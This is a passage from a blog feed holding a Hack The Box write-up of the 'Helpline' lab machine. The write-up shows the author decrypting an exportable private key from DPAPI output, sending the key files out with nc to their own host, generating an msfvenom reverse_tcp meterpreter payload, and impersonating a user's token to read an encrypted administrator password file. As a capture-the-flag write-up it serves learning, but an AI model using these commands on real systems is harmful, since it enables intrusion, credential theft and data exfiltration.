8bb20d8138ac743fbff1a43934bbdcff40145ebc815edaf5080d63656236aba75261d7fe0b915e393912d8fe731bb4ab232f88553918c17d95f81605fb24bb9a7527e2eda01fc088e653ce99d58143a74595d47169cf58a2308e128e3956c0c4e225b1dfa0cd8cf030$
b670977c3b62b30bd09846e993779c4471cbd0682dc9bf038bfb8daf8286c0fd4fbcdcf135cb48dc38f0d34342a0116aef4211104657c20db578d9b21b2dbe2505bccc86a48b343f0f9df63482562f86f4015e6dc327a209684049188251506a8f39ae8946a9cdec43$
bb71e7d4fac63f33932dd0bd52fa5ffd48ff11c415e856a496252378fb19c456c3e191a19621c292654af48228906eac7ae5717a77a2c616e194ea9189e77cfa0252da0180fe128fa9f3a0cd826f7530dc03428e6ecbbc7ae7bffe0ce2780b3ba686c3d73f3da55af6$
65fec2c22cbb119a698c5bbbed802d3a31fb44e395606adb58e0b0e2030910281dbeeb76bddebf2ae6862633f839324cb72a9c05a7d24acc3cdad9648be0e816039581d4eb3ddefdc1457d3175b5c776ca445bd409038b6369fa9151f6ee88ab44e9d64b40ecd09e89$
7e2b36e51c44f93bc5a985c13cc0f8d31aad776167b027c28a09943580d848af506c68a400ed93734dbe579a84837a90c6fd60d338e9e981599086da725d7e6c87f89f9a59979672a8b74c704e848fc6cac786e49a3b7f310b2839d67652a9ae3018ce6aca06f6e60b$
bcf526f859a618b32b7b112088eefccf69e873e1d62a20b416203a2428d08abe22518eecfe0a5115a82efb21d467854444b15db49e82c4442aaa045fdf4ea725295da78d14082c9140b6ea6356039b48e53fb7eb8d3ea21713c346d6ff381aaf709c5e83e7d0c5e330f
f7374caccf6312f8f36afc041fcfd89a7e93d453393c991c3887d6b98179cc254172dfd4a09c968a25dab0b53df6f38c6b22e9352d0920789920659b1cb55c61f74bccb63fc397e0997f896e55efbaf200629dd399584f1675ebe588b025ee4160387aa3a5a3239899c
75a97eddbf5dc1dbf4defb894091c851f73413e2da6d7a39e23481dcda7857311a2816d720c0da057952e2d4218b2f4f735469cc4d15324de94b7036fb072afdb708929363934351feecc27c0c81206cafaa7bd5748456799cb528773cafc4b6f6fa25c6bc617b537ac
b354b10ddeb628974ad787f792a9b2564741b1ca8538de0647ab945e25aec233b247ca228111bcdafeed17f032d7277507934895b07197e8331451cd9eff35681afc625741ff13ee1daac61e16bea787ad2b3901a52d29c75c33a31d7993ed92a70d2196109d59b817f
e6471f24540f59c95d082556d05333201a4f54c71db4d135308c5339ecf8c63258a73e71d86b7ec0f3d71b8103de2d4b886b51f9994eb2f8a62c9bb444f8e1c19096085d4a67a9a16a9b74bb2d74c0298e499260dcdedd2d1cf94ed1f2e2bf1c4a194f79a3ff1bfb17c
6a
    dwSignLen          : 00000040 - 64
    pbSign             : b3854af7c1faaa30806aa909e65813225a9aede7b0705c4c186d080ced4883b22e9a06acfb1d7762b1c69e368dcecd0de3a7e8b8f112e61cd9231ad5c5eef596

  pExExportFlag      :
  **BLOB**
    dwVersion          : 00000001 - 1
    guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    dwMasterKeyVersion : 00000001 - 1
    guidMasterKey      : {2f452fc5-c6d2-4706-a4f7-1cd6b891c017}
    dwFlags            : 00000000 - 0 ()
    dwDescriptionLen   : 00000018 - 24
    szDescription      : Export Flag
    algCrypt           : 00006610 - 26128 (CALG_AES_256)
    dwAlgCryptLen      : 00000100 - 256
    dwSaltLen          : 00000020 - 32
    pbSalt             : 61af1a324f58c63a6bb3767357892b8c95d9a9a0dea6da062322afc39734c72a
    dwHmacKeyLen       : 00000000 - 0
    pbHmackKey         :
    algHash            : 0000800e - 32782 (CALG_SHA_512)
    dwAlgHashLen       : 00000200 - 512
    dwHmac2KeyLen      : 00000020 - 32
    pbHmack2Key        : ee6cef3310951fa86aba9b0bc3b23c237d23fbac008175bf670b68b73899e983
    dwDataLen          : 00000010 - 16
    pbData             : 3766e1ec88316997e9aeb13d847c396e
    dwSignLen          : 00000040 - 64
    pbSign             : 1d17141018652ad326ebd1a9c3030feb1356fede8002391d9fbba2d5c75221e654aef732841a04638f5577b59e63c8037ed26c7e4f6d1ed34a6244c33e631800

Decrypting AT_EXCHANGE Export flags:
 * volatile cache: GUID:{2f452fc5-c6d2-4706-a4f7-1cd6b891c017};KeyHash:8ece5985210c26ecf3dd9c53a38fc58478100ccb                                                                                                   
 * masterkey     : 8ece5985210c26ecf3dd9c53a38fc58478100ccb
01000000
Decrypting AT_EXCHANGE Private Key:
 * volatile cache: GUID:{2f452fc5-c6d2-4706-a4f7-1cd6b891c017};KeyHash:8ece5985210c26ecf3dd9c53a38fc58478100ccb                                                                                                   
 * masterkey     : 8ece5985210c26ecf3dd9c53a38fc58478100ccb
525341320801000000080000ff0000000100010031c3db401c7b5d3713443127af3f97dbe03b6cbcccb3df5be3581cdf50f2f45adec256b7c2b95af46aad7cdbe23308333b30c43d5baeda431a237d75f03a81aa713fae3cd9ef6363754362f219c555d7feb1b7423f9
d55a9cd2b8b4a559abcc2f349e707cfd966bba3cf70ab2dc663153598b33491a4492542d8ee2e0845aefa860ebe0d284b4ac32045053f7f167c7e4fbdc75bf53287dd598682dfffcd17dac3e550b3897bdb1a82c55809a124de231dfdd0e51d19fa1bf7d748e524919d
abdb427297dcc79eef2110c90bd44ebbdd720d4d69183b8691969fef65f1e19cebb8441da32f82ed4ba773b95666742a4650ef0ceece54d73130ed1a19c3bb61b600000000000000006b686e241f8ac960bd719549bd40384959b682321394b15dd99070665bb0b3177
4d9a149b5b097b7ab965763e5592eeae40896efd89c92ef20519b995ac65c9258a8973e021efb6255514a42e5af7aa7ad028349c8ba92b61e2cb52ea740f15cdabf14f23f1aea32b3ab47c4ce72be3920314e8096fda33dd978fee18c79fde000000000d3d94b2498e1
0b913cc5c026ee19c672eaafe6eab8bb92b5c45b22be438d469a197a08b0ce230a926bf2418256c8397d5630de1ff89275cd1fa2ed1170b3408e697a505b61262a44db96763a532322a2cc070520af4f4539c4f44754513932481b76bd5765a7196cac8bf9fe9fad0d7
4460ece6677a99096b565705cc3de84cf00000000ff61d229009652074adf5045582172ff5638b61254e044b4714eb7f7261c019415a30c6e8bd1fa1d1fbc1ef0620394594d83ab2796416b80acb40ca77d7cccc1eca5eef9c6e0892e144defb31f6f3b20a69201485e
7058d72851f697307898c3957a3bb0bf0e65f1beb40b182c66627138fe5c264231d16d013bac509b9c937d00000000c7fc63389c2c563d9c380fc70de0774025d8f4a7ee15dd8c69de0ae2e5a8f881f939ade966c736ef7188374a9730ddfc99f5791d59ca8de461fbb
44a5326a29aee91d5f0eb903eb9ede3a76b03df9929b2afec0766e7dca2f4b25f4e370d95759db76a89c42812ba2c1a670a6727d8424f62c344f87dbf0b2686959335811e0e00000000505ecc240eefef332854553feabb019fa075baa1148953d142582f82d6cf1fc0
72267bd574d0d665dfafb8c9be8afd434f2250a840c6a0f80be883c70dafea4b6a1a23c29534a49188fa9c1c7df45788da79ced400db29799a057938fa3059f1ded01cbb8635dc3579ded3e9c16fc2d4bb7085ddda143c16657e24c2876c88bc00000000e1f11d6633a
644709fa252d8614531d2e8da61fc078ae8bfd91ce60582c914873d9dc6825bdd453d00594e3e286f1b843dd7154a8a67378272b2fce204162c87cb80320bd8a7e31bf646ee6b54635a4242abddef81876be6d33d9ffa356fb306c364c902ba52a43d9776d9c88d8de4
fcf11fea675cc8c1a1dcc79da2e3ec931f8fe342fecef6c883649e86cfda7d34cc01e0a128424df5d3a6f17dbea80983a6b4e14cb19c5a039b290bcdfe4c48dce945985f1c9d3464fec51b26b59d8ceacb52f5030d322566de54d42806900343b47d03ba31f67b60495
73ededc194c1be20f2a02700dc25de6e18b26d1dcc7b189c1822e6d2370c1ecc8af73e924000f2c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
        Exportable key : YES
        Key size       : 2048
        Private export : OK - 'raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-used-nc-to-transfer-the-der-and-pvk-files-to-my-box-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to transfer the &lt;code class=&quot;highlighter-rouge&quot;&gt;der&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pvk&lt;/code&gt; files to my box :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\System32\spool\drivers\color&amp;gt;nc.exe -w 3 10.10.xx.xx 1440 &amp;lt; 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
nc.exe -w 3 10.10.xx.xx 1440 &amp;lt; 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der

C:\Windows\System32\spool\drivers\color&amp;gt;nc.exe -w 3 10.10.xx.xx 1440 &amp;lt; raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk        
nc.exe -w 3 10.10.xx.xx 1440 &amp;lt; raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk

C:\Windows\System32\spool\drivers\color&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/helpline/tolu# nc -lp 1440 &amp;gt; 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der 
root@kali:~/Desktop/HTB/boxes/helpline/tolu# ls -la                                                                    
total 12
drwxr-xr-x 2 root root 4096 Aug 16 16:50 .
drwxr-xr-x 6 root root 4096 Aug 16 16:50 ..
-rw-r--r-- 1 root root  765 Aug 16 16:50 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
root@kali:~/Desktop/HTB/boxes/helpline/tolu# nc -lp 1440 &amp;gt; raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk                                                             
root@kali:~/Desktop/HTB/boxes/helpline/tolu# ls -la                                         
total 16
drwxr-xr-x 2 root root 4096 Aug 16 16:51 .
drwxr-xr-x 6 root root 4096 Aug 16 16:50 ..
-rw-r--r-- 1 root root  765 Aug 16 16:50 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der
-rw-r--r-- 1 root root 1196 Aug 16 16:51 raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-created-the-pfx-with-openssl-&quot;&gt;Then I created the &lt;code class=&quot;highlighter-rouge&quot;&gt;pfx&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;openssl&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl x509 -inform DER -outform PEM -in 91EF5D08D1F7C60AA0E4CEE73E050639A6692F29.der -out public.pem
root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl rsa -inform PVK -outform PEM -in raw_exchange_capi_0_e65e6804-f9cd-4a35-b3c9-c3a72a162e4d.pvk -out private.pem
writing RSA key
root@kali:~/Desktop/HTB/boxes/helpline/tolu# openssl pkcs12 -in public.pem -inkey private.pem -password pass:mimikatz -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-finally-i-imported-it-and-i-was-able-to-read-the-flag-&quot;&gt;And finally I imported it and I was able to read the flag :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-found-later-that-i-could-also-use-invoke-command-as-tolu-and-i-would-be-able-to-read-the-flag-still-dont-know-why-i-couldnt-read-it-from-a-winrm-session&quot;&gt;I found later that I could also use &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;tolu&lt;/code&gt; and I would be able to read the flag, still don’t know why I couldn’t read it from a &lt;code class=&quot;highlighter-rouge&quot;&gt;winrm&lt;/code&gt; session.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Windows\System32\spool\drivers\color&amp;gt; $username = &quot;Helpline\tolu&quot;
$username = &quot;Helpline\tolu&quot;
PS C:\Windows\System32\spool\drivers\color&amp;gt; $password = &quot;!zaq1234567890pl!99&quot;
$password = &quot;!zaq1234567890pl!99&quot;
PS C:\Windows\System32\spool\drivers\color&amp;gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Windows\System32\spool\drivers\color&amp;gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\Windows\System32\spool\drivers\color&amp;gt; Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock { type C:\Users\tolu\Desktop\user.txt }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-user&quot;&gt;We got user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;roottxt&quot;&gt;root.txt&lt;/h3&gt;
&lt;h4 id=&quot;there-was-a-file-called-admin-passxml-in-cusersleodesktop&quot;&gt;There was a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;admin-pass.xml&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\leo\Desktop&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\leo\Desktop&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of C:\Users\leo\Desktop

01/15/2019  01:21 AM    &amp;lt;DIR&amp;gt;          .
01/15/2019  01:21 AM    &amp;lt;DIR&amp;gt;          ..
01/15/2019  01:18 AM               526 admin-pass.xml
               1 File(s)            526 bytes
               2 Dir(s)   5,850,574,848 bytes free

C:\Users\leo\Desktop&amp;gt;type admin-pass.xml
type admin-pass.xml
Access is denied.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;only-leo-can-read-it-leos-hash-was-uncrackable-so-i-looked-for-other-ways-to-be-leo-i-wanted-to-see-if-i-can-impersonate-leos-token-so-i-created-a-metasploit-payload-and-got-a-meterpreter-session&quot;&gt;Only &lt;code class=&quot;highlighter-rouge&quot;&gt;leo&lt;/code&gt; can read it. &lt;code class=&quot;highlighter-rouge&quot;&gt;leo's&lt;/code&gt; hash was uncrackable so I looked for other ways to be &lt;code class=&quot;highlighter-rouge&quot;&gt;leo&lt;/code&gt;. I wanted to see if I can impersonate &lt;code class=&quot;highlighter-rouge&quot;&gt;leo&lt;/code&gt;’s token so I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt; payload and got a &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=1441 -f exe &amp;gt; m.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-yes-i-could-impersonate-leos-token-&quot;&gt;And yes, I could impersonate &lt;code class=&quot;highlighter-rouge&quot;&gt;leo&lt;/code&gt;’s token :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; load incognito 
Loading extension incognito...Success.
meterpreter &amp;gt; list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
HELPLINE\leo
HELPLINE\tolu
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available

meterpreter &amp;gt; impersonate_token 'HELPLINE\leo'
[+] Delegation token available
[+] Successfully impersonated user HELPLINE\leo
meterpreter &amp;gt; shell -t 
Process 5344 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.253]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\System32\spool\drivers\color&amp;gt;whoami
whoami
helpline\leo

C:\Windows\System32\spool\drivers\color&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-we-can-read-admin-passxml-&quot;&gt;Now we can read &lt;code class=&quot;highlighter-rouge&quot;&gt;admin-pass.xml&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\System32\spool\drivers\color&amp;gt;cd c:\users\leo\desktop
cd c:\users\leo\desktop

c:\Users\leo\Desktop&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is D258-5C3B

 Directory of c:\Users\leo\Desktop

01/15/2019  01:21 AM    &amp;lt;DIR&amp;gt;          .
01/15/2019  01:21 AM    &amp;lt;DIR&amp;gt;          ..
01/15/2019  01:18 AM               526 admin-pass.xml
               1 File(s)            526 bytes
               2 Dir(s)   5,719,506,944 bytes free

c:\Users\leo\Desktop&amp;gt;type admin-pass.xml
type admin-pass.xml
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000f2fefa98a0d84f4b917dd8a1f5889c8100000000020000000000106600000001000020000000c2d2dd6646fb78feb6f7920ed36b0ade40efeaec6b090556fe6efb52a7e847cc000000000e8000000002000020000000c41d656142bd869ea7eeae22fc00f0f707ebd676a7f5fe04a0d0932dffac3f48300000006cbf505e52b6e132a07de261042bcdca80d0d12ce7e8e60022ff8d9bc042a437a1c49aa0c7943c58e802d1c758fc5dd340000000c4a81c4415883f937970216c5d91acbf80def08ad70a02b061ec88c9bb4ecd14301828044fefc3415f5e128cfb389cbe8968feb8785914070e8aebd6504afcaa

c:\Users\leo\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-used-invoke-command-again-and-used-get-content-to-read-admin-passxml-instead-of-putting-the-password-in-a-variable&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; again and used &lt;code class=&quot;highlighter-rouge&quot;&gt;Get-Content&lt;/code&gt; to read &lt;code class=&quot;highlighter-rouge&quot;&gt;admin-pass.xml&lt;/code&gt; instead of putting the password in a variable.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\Users\leo\Desktop&amp;gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\leo\Desktop&amp;gt; $username = &quot;Helpline\Administrator&quot;
$username = &quot;Helpline\Administrator&quot;
PS C:\Users\leo\Desktop&amp;gt; $password = &quot;admin-pass.xml&quot;
$password = &quot;admin-pass.xml&quot;
PS C:\Users\leo\Desktop&amp;gt; $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, (Get-Content $password | ConvertTo-SecureString)
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username, (Get-Content $password | ConvertTo-SecureString)
PS C:\Users\leo\Desktop&amp;gt; Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}
Invoke-Command -ComputerName HELPLINE -Credential $credential -Authentication credssp -ScriptBlock {type C:\Users\Administrator\Desktop\root.txt}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/helpline/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-root-&quot;&gt;We owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---arkham&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/arkham/&quot;&gt;Hack The Box - Arkham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---unattended&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/unattended/&quot;&gt;Hack The Box - Unattended&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Web" /><category term="RCE" /><category term="Cryptography" /><category term="Windows Exploitation" /><summary type="html">Quick Summary Hey guys today Helpline retired and here’s my write-up about it. I really liked this box because It taught me some interesting stuff about Windows internals. The first shell I got on this box was as nt authority/system which means that I technically rooted the box. But the flags were EFS encrypted so I had to find a way to read them. It’s a Windows box and its ip is 10.10.10.152, I added it to /etc/hosts as helpline.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` Nmap 7.70 scan initiated Thu Aug 15 20:55:21 2019 as: nmap -sV -sT -sC -o nmapinitial helpline.htb Nmap scan report for helpline.htb (10.10.10.132) Host is up (0.10s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? 8080/tcp open http-proxy - | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Set-Cookie: JSESSIONID=65E8A121BA313E88FEEFE9C1E493AC61; Path=/; HttpOnly | Cache-Control: private | Expires: Thu, 01 Jan 1970 01:00:00 GMT | Content-Type: text/html;charset=UTF-8 | Vary: Accept-Encoding | Date: Thu, 15 Aug 2019 17:55:43 GMT | Connection: close | Server: - | &amp;lt;!DOCTYPE html&amp;gt; | &amp;lt;html&amp;gt; | &amp;lt;head&amp;gt; | | | | | | | | HTTPOptions: | HTTP/1.1 200 OK | Set-Cookie: JSESSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9; Path=/; HttpOnly | Cache-Control: private | Expires: Thu, 01 Jan 1970 01:00:00 GMT | Content-Type: text/html;charset=UTF-8 | Vary: Accept-Encoding | Date: Thu, 15 Aug 2019 17:55:45 GMT | Connection: close | Server: - | &amp;lt;!DOCTYPE html&amp;gt; | &amp;lt;html&amp;gt; | &amp;lt;head&amp;gt; | | | | | | |_ |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: - |_http-title: ManageEngine ServiceDesk Plus 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.70%I=7%D=8/15%Time=5D55AAAF%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,2328,”HTTP/1.1\x20200\x20OK\r\nSet-Cookie:\x20JSESSIONID=65E8 SF:A121BA313E88FEEFE9C1E493AC61;\x20Path=/;\x20HttpOnly\r\nCache-Control:\ SF:x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:00:00\x20GMT\ SF:r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Accept-Encoding SF:\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:43\x20GMT\r\nConnection SF::\x20close\r\nServer:\x20-\r\n\r\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html&amp;gt;\n&amp;lt;head&amp;gt;\n&amp;lt; SF:meta\x20http-equiv=&quot;X-UA-Compatible&quot;\x20content=&quot;IE=Edge&quot;&amp;gt;\n\n\n\n\ SF:r\n\n\x20\x20\x20\x20&amp;lt;script\x20language=’JavaScript’\x20type=&quot;text/ja SF:vascript&quot;\x20src=’/scripts/Login.js\?9309’&amp;gt;&amp;lt;/script&amp;gt;\n\x20\x20\x20\x2 SF:0&amp;lt;script\x20language=’JavaScript’\x20type=&quot;text/javascript&quot;\x20src=’/ SF:scripts/jquery-1.8.3.min.js’&amp;gt;&amp;lt;/script&amp;gt;\n\x20\x20\x20\x20\n\x20\x20\ SF:x20\x20&amp;lt;link\x20href=&quot;/style/loginstyle.css\?9309&quot;\x20type=&quot;text/cs SF:s&quot;\x20rel=&quot;stylesheet&quot;/&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20href=&quot;/style/new SF:-classes.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;&amp;gt;\n\x20 SF:\x20\x20\x20&amp;lt;link\x20href=&quot;/style/new-classes-sdp.css\?9309&quot;\x20type SF:=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20href=&quot;/ SF:style/conflict-fix.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;styleshee SF:t&quot;&amp;gt;”)%r(HTTPOptions,2328,”HTTP/1.1\x20200\x20OK\r\nSet-Cookie:\x20JSE SF:SSIONID=27315C0AAF7C9B2D64D6C2B7EFD03FD9;\x20Path=/;\x20HttpOnly\r\nCac SF:he-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2001:0 SF:0:00\x20GMT\r\nContent-Type:\x20text/html;charset=UTF-8\r\nVary:\x20Acc SF:ept-Encoding\r\nDate:\x20Thu,\x2015\x20Aug\x202019\x2017:55:45\x20GMT\r SF:\nConnection:\x20close\r\nServer:\x20-\r\n\r\n&amp;lt;!DOCTYPE\x20html&amp;gt;\n&amp;lt;html SF:&amp;gt;\n&amp;lt;head&amp;gt;\n&amp;lt;meta\x20http-equiv=&quot;X-UA-Compatible&quot;\x20content=&quot;IE=Edge SF:&quot;&amp;gt;\n\n\n\n\r\n\n\x20\x20\x20\x20&amp;lt;script\x20language=’JavaScript’\x20ty SF:pe=&quot;text/javascript&quot;\x20src=’/scripts/Login.js\?9309’&amp;gt;&amp;lt;/script&amp;gt;\n\x2 SF:0\x20\x20\x20&amp;lt;script\x20language=’JavaScript’\x20type=&quot;text/javascript SF:&quot;\x20src=’/scripts/jquery-1.8.3.min.js’&amp;gt;&amp;lt;/script&amp;gt;\n\x20\x20\x20\x2 SF:0\n\x20\x20\x20\x20&amp;lt;link\x20href=&quot;/style/loginstyle.css\?9309&quot;\x20ty SF:pe=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;/&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20href= SF:&quot;/style/new-classes.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;stylesh SF:eet&quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link\x20href=&quot;/style/new-classes-sdp.css\?93 SF:09&quot;\x20type=&quot;text/css&quot;\x20rel=&quot;stylesheet&quot;&amp;gt;\n\x20\x20\x20\x20&amp;lt;link SF:\x20href=&quot;/style/conflict-fix.css\?9309&quot;\x20type=&quot;text/css&quot;\x20rel SF:=&quot;stylesheet&quot;&amp;gt;”); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/helpline/0.png" /></entry><entry><title type="html">Hack The Box - Arkham</title><link href="http://localhost:4000/hack-the-box/arkham/" rel="alternate" type="text/html" title="Hack The Box - Arkham" /><published>2019-08-10T00:00:00+02:00</published><updated>2019-08-10T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/arkham</id><content type="html" xml:base="http://localhost:4000/hack-the-box/arkham/">&lt;hr /&gt;

